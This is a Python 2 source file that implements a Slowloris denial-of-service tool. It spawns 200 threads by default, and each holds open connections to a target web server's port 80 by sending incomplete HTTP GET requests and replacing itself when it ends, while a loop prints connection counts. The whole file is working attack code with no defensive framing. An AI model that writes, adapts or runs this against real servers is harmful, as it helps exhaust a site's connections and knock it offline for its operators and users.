import socket
import threading
import time
import thread

class Slowloris:

    URL = ""

    threads = 0
    connected = 0
    closed = 0
    error = 0

    def __init__(self, url):
        self.URL = url

    def request(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((socket.gethostbyname(self.URL), 80))
        except socket.error:
            self.error += 1

            # Something must be open before it's closed. It shouldn't be considered as closing.
            self.closed -= 1

        try:
            self.connected += 1
            sock.send("GET / HTTP/1.1\r\n"
                      "Host: " + self.URL + "\r\n")

        except socket.error: pass

        try: sock.recv(1024)
        except socket.error: pass

        self.connected -= 1
        self.closed += 1

        return self.start_new_thread()

    def start_new_thread(self):
        try:
            threading.Thread(target=self.request).start()
        except thread.error:
            return

    def attack(self, num_of_threads=200):
        for x in xrange(0, num_of_threads, 1):
            self.start_new_thread()

        self.monitor()

    def monitor(self):
        while 1:
            print "Connected:", self.connected, "Closed:", self.closed, "Error:", self.error
            time.sleep(5)
